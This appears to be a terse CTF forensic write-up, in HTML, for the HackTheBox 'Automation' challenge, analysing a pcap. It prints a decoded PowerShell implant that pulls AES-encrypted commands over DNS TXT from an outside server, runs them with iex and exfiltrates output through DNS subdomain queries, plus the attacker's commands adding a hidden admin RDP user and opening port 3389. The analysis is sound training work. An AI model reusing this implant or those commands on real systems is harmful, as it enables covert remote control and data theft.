@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>Automation(forensic challenge) · the-grizzly-bear</title>
+<meta name="description" content="Automation(forensic challenge) — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="../../../index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/completed-machines/three/automation-forensic-challenge.html" data-root="../../.."></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="../../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../../index.html">HackTheBox</a> &rsaquo; <a href="../index.html">Completed Machines</a> &rsaquo; <a href="index.html">three</a></div>
+<h1 id="title">Automation(forensic challenge)</h1>
+
+<p>pcap file</p>
+<p>first useful item</p>
+<p class="figure"><a class="img-link" href="automation-forensic-challenge/untitled.png"><img src="automation-forensic-challenge/untitled.png" alt="Untitled" loading="lazy"></a></p>
+<p>decoded payload</p>
+<p>function Create-AesManagedObject($key, $IV) {<br>
+$aesManaged = New-Object "System.Security.Cryptography.AesManaged"<br>
+$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC<br>
+$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros<br>
+$aesManaged.BlockSize = 128<br>
+$aesManaged.KeySize = 256<br>
+if ($IV) {<br>
+if ($IV.getType().Name -eq "String") {<br>
+$aesManaged.IV = [System.Convert]::FromBase64String($IV)</p>
+<pre><code>    }
+    else {
+        $aesManaged.IV = $IV
+
+    }
+}
+if ($key) {
+
+    if ($key.getType().Name -eq "String") {
+        $aesManaged.Key = [System.Convert]::FromBase64String($key)
+    }
+    else {
+        $aesManaged.Key = $key
+    }
+}
+$aesManaged
+</code></pre>
+<p>}</p>
+<p>function Create-AesKey() {</p>
+<pre><code>$aesManaged = Create-AesManagedObject $key $IV
+[System.Convert]::ToBase64String($aesManaged.Key)
+</code></pre>
+<p>}</p>
+<p>function Encrypt-String($key, $unencryptedString) {<br>
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)<br>
+$aesManaged = Create-AesManagedObject $key<br>
+$encryptor = $aesManaged.CreateEncryptor()<br>
+$encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);<br>
+[byte[]] $fullData = $aesManaged.IV + $encryptedData<br>
+$aesManaged.Dispose()<br>
+[System.BitConverter]::ToString($fullData).replace("-","")<br>
+}</p>
+<p>function Decrypt-String($key, $encryptedStringWithIV) {<br>
+$bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)<br>
+$IV = $bytes[0..15]<br>
+$aesManaged = Create-AesManagedObject $key $IV<br>
+$decryptor = $aesManaged.CreateDecryptor();<br>
+$unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);<br>
+$aesManaged.Dispose()<br>
+[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)<br>
+}</p>
+<p>filter parts($query) { $t = $<em>; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $</em>, [math]::min($query, $t.length - $query * $_)) }}<br>
+$key = "a1E4MUtycWswTmtrMHdqdg=="<br>
+$out = Resolve-DnsName -type TXT -DnsOnly <a href="http://windowsliveupdater.com/" target="_blank" rel="noopener">windowsliveupdater.com</a> -Server 147.182.172.189|Select-Object -Property Strings;<br>
+for ($num = 0 ; $num -le $out.Length-2; $num++){<br>
+$encryptedString = $out[$num].Strings[0]<br>
+$backToPlainText = Decrypt-String $key $encryptedString<br>
+$output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32<br>
+Resolve-DnsName -type A -DnsOnly <a href="http://start.windowsliveupdater.com/" target="_blank" rel="noopener">start.windowsliveupdater.com</a> -Server 147.182.172.189<br>
+for ($ans = 0; $ans -lt $pr.length-1; $ans++){<br>
+$domain = -join($pr[$ans],".windowsliveupdater.com")<br>
+Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189<br>
+}<br>
+Resolve-DnsName -type A -DnsOnly <a href="http://end.windowsliveupdater.com/" target="_blank" rel="noopener">end.windowsliveupdater.com</a> -Server 147.182.172.189<br>
+}</p>
+<p class="figure"><a class="img-link" href="automation-forensic-challenge/untitled-1.png"><img src="automation-forensic-challenge/untitled-1.png" alt="Untitled" loading="lazy"></a></p>
+<pre><code>#$output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32
+$output = write-host $backToPlainText; $pr = Encrypt-String $key $output | parts 32</code></pre>
+<p><code>http.request.method == "GET"</code></p>
+<p class="figure"><a class="img-link" href="automation-forensic-challenge/untitled-2.png"><img src="automation-forensic-challenge/untitled-2.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="automation-forensic-challenge/untitled-3.png"><img src="automation-forensic-challenge/untitled-3.png" alt="Untitled" loading="lazy"></a></p>
+<p>PD.......... <a href="http://ba20e34aacc4774f067442c6622f5da2.windowsliveupdater.com/" target="_blank" rel="noopener">BA20E34AACC4774F067442C6622F5DA2.windowsliveupdater.com</a>.....PD.......... <a href="http://ba20e34aacc4774f067442c6622f5da2.windowsliveupdater.com/" target="_blank" rel="noopener">BA20E34AACC4774F067442C6622F5DA2.windowsliveupdater.com</a>..............,......</p>
+<p class="figure"><a class="img-link" href="automation-forensic-challenge/untitled-4.png"><img src="automation-forensic-challenge/untitled-4.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="automation-forensic-challenge/untitled-5.png"><img src="automation-forensic-challenge/untitled-5.png" alt="Untitled" loading="lazy"></a></p>
+<p>hostname</p>
+<p>whoami</p>
+<p>ipconfig</p>
+<p>wmic /namespace:\\root\SecurityCenter PATH AntiVirusProduct GET /value</p>
+<p>net user DefaultUsr "JHBhcnQxPSdIVEJ7eTB1X2M0bl8n" /add /Y; net localgroup Administrators /add DefaultUsr; net localgroup "Remote Desktop Users" /add DefaultUsr</p>
+<p>netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389</p>
+<p>$part1='HTB{y0u_c4n_’</p>
+<p>filtered on dns &gt;32</p>
+<p>exported as csv</p>
+<p>cleaned up in sheets</p>
+<p class="figure"><a class="img-link" href="automation-forensic-challenge/untitled-6.png"><img src="automation-forensic-challenge/untitled-6.png" alt="Untitled" loading="lazy"></a></p>
+<p>CC1C9AC2958A2E63609272E2B4F8F436</p>
+<hr>
+<p>32A806549B03AB7E4EB39771AEDA4A1B</p>
+<hr>
+<p>C1006AC8A03F9776B08321BD6D5247BB</p>
+<hr>
+<p>7679895D1CF7C07BB6A348E1AA4AFC65</p>
+<hr>
+<p>5958A6856F1A34AAD5E97EA55B087670</p>
+<hr>
+<p>35F2497E5836EA0ECA1F1280F59742A3</p>
+<hr>
+<p>09E28DD82C14BC32513652DAC2F2C27B</p>
+<hr>
+<p>0D73A3288A980D8FCEF94BDDCF9E2822</p>
+<hr>
+<p>2A1CA17BB2D90FCD6158856348790414</p>
+<hr>
+<p>20FC39C684A9E371CC3A06542B666005</p>
+<hr>
+<p>5840BD94CCE65E23613925B4D9D2BA53</p>
+<hr>
+<p>18EA75BC653004D45D505ED62567017A</p>
+<hr>
+<p>6FA4E7593D83092F67A81082D9930E99</p>
+<hr>
+<p>BA20E34AACC4774F067442C6622F5DA2</p>
+<hr>
+<p>A9B09FF558A8DF000ECBD37804CE663E</p>
+<hr>
+<p>3521599BC7591005AB6799C57068CF0D</p>
+<hr>
+<p>C6884CECF01C0CD44FD6B82DB788B35D</p>
+<hr>
+<p>62F02E4CAA1D973FBECC235AE9F40254</p>
+<hr>
+<p>C63D3C93C89930DA2C4F42D9FC123D8B</p>
+<hr>
+<p>AB00ACAB5198AFCC8C6ACD81B19CD264</p>
+<hr>
+<p>CC6353668CEA4C88C8AEEA1D58980022</p>
+<hr>
+<p>DA8FA2E917F17C28608818BF550FEA66</p>
+<hr>
+<p>973B5A8355258AB0AA281AD88F5B9EB1</p>
+<hr>
+<p>03AC666FE09A1D449736335C09484D27</p>
+<hr>
+<p>1C301C6D5780AB2C9FA333BE3B0185BF</p>
+<hr>
+<p>071FB1205C4DBEAA2241168B0748902A</p>
+<hr>
+<p>6CE14903C7C47E7C87311044CB9873A4</p>
+<hr>
+<p>ECABC349D27C0B0FFFD1ACEEDBE06BB6</p>
+<hr>
+<p>C2EB000EE4F9B35D6F001500E85642A2</p>
+<hr>
+<p>DCC8F1BE2CF4D667F458C1DE46D24B1C</p>
+<hr>
+<p>2E0F5D94E52649C70402C1B0A2FF7B49</p>
+<hr>
+<p>FC32DDD67F275307A74B2C4D0864B3F0</p>
+<hr>
+<p>486186DA9443EB747F717B3911C959DC</p>
+<hr>
+<p>7E300844D60655410C3988238E615D61</p>
+<hr>
+<p>6F33D27F63CE4D1E065A416911BC50D4</p>
+<hr>
+<p>58749599D2CB08DB561988EB2902E05D</p>
+<hr>
+<p>9886FDDAC2BED6F6DA73637AD2F20CF1</p>
+<hr>
+<p>99B8CE3D9DEE03C0180C7D1198B49C02</p>
+<hr>
+<p>769E5EE4EAB896D7D3BB478EA1408167</p>
+<hr>
+<p>79472A243BFB0852AF372323EC132988</p>
+<hr>
+<p>3C81A3F2AEB1D3DAAE8496E1DBF97F43</p>
+<hr>
+<p>5AE40A09203B890C4A174D77CB7026C4</p>
+<hr>
+<p>E990A6FB6424A7501823AD31D3D6B634</p>
+<hr>
+<p>4C7971C8D447C078C4471732AD881C39</p>
+<hr>
+<p>4BC8B1A66E0BED43DDC359269B57D1D5</p>
+<hr>
+<p>D68DCD2A608BF61716BB47D6FE4D5C9D</p>
+<hr>
+<p>6E8BB2981F214A8234B0DD0210CA96EB</p>
+<hr>
+<p>2D6322B0F7F3D748C4C9F8B80EFF5A69</p>
+<hr>
+<p>21A3D1A8621A49F4D29BC9851D25230B</p>
+<hr>
+<p>841BDB4E9E5F8BF721B58E8308177B57</p>
+<hr>
+<p>2E9A015967DA5BF11AC9155FC2159C8F</p>
+<hr>
+<p>610CD82F818B4BDF5E48722DAF4BEEEB</p>
+<hr>
+<p>ABCE30583F503B484BF99020E28A1B8F</p>
+<hr>
+<p>282A23FEB3A21C3AD89882F5AC0DD3D5</p>
+<hr>
+<p>7D87875231652D0F4431EC37E51A09D5</p>
+<hr>
+<p>7E2854D11003AB6E2F4BFB4F7E2477DA</p>
+<hr>
+<p>A44FCA3BC6021777F03F139D458C0524</p>
+<hr>
+<p>AE4ABE8A3A88D21DEEA071A72D65A35E</p>
+<hr>
+<p>F158D9F025897D1843E37B7463EC7833</p>
+<hr>
+<p>powershell key</p>
+<p class="figure"><a class="img-link" href="automation-forensic-challenge/untitled-7.png"><img src="automation-forensic-challenge/untitled-7.png" alt="Untitled" loading="lazy"></a></p>
+<p>kQ81Krqk0Nkk0wjv</p>
+<p>first 16 of first dns query, utf8</p>
+<p class="figure"><a class="img-link" href="automation-forensic-challenge/untitled-8.png"><img src="automation-forensic-challenge/untitled-8.png" alt="Untitled" loading="lazy"></a></p>
+<p>$part1='HTB{y0u_c4n_’</p>
+<p>$part2=4utom4t3_but_y0u_c4nt_h1de}</p>
+  </article>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+</main>
+</div>
+<script src="../../../assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
